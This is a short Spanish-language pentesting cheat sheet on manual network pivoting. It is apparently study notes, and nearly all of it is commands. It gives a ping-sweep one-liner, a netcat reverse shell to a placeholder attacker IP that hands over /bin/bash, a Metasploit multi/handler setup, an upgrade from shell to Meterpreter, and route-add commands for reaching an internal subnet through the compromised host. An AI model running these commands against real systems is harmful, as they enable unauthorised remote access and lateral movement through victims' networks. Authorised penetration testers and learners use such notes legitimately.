# Pivoting Manual (sin Metasploit Automatizado)

## 1. Escanear la Red Interna

Ping sweep con one liner:

```shell
for i in {1..254}; do (ping -c 1 -W 1 <192.168.1>.$i | grep "bytes from" &) ;done
```

## 2. Conseguir Sesión de Shell

Recibir conexión:

```bash
nc <IP_atacante> <puerto> -e /bin/bash
```

Enviar conexión desde Metasploit:

```msf6
sudo msfconsole -q
use multi/handler
set LHOST <IP_atacante>
set LPORT <puerto>
run
```

Enviar la sesión a segundo plano:

```bash
Ctrl+Z
sessions
```

## 3. Convertir Shell a Meterpreter

```msf6
use post/multi/manage/shell_to_meterpreter
set LHOST <IP_atacante>
set SESSION 1
run
```

```msf6
sessions
session -i 2
Ctrl+Z
```

## 4. Añadir Ruta (Route Add)

```msf6
route
route add <red_interna/24> 2
route
```

> `route del <red>` para eliminar una red añadida.

## 5. Port Forwarding

Metodología en 01_Pivoting_con_Metasploit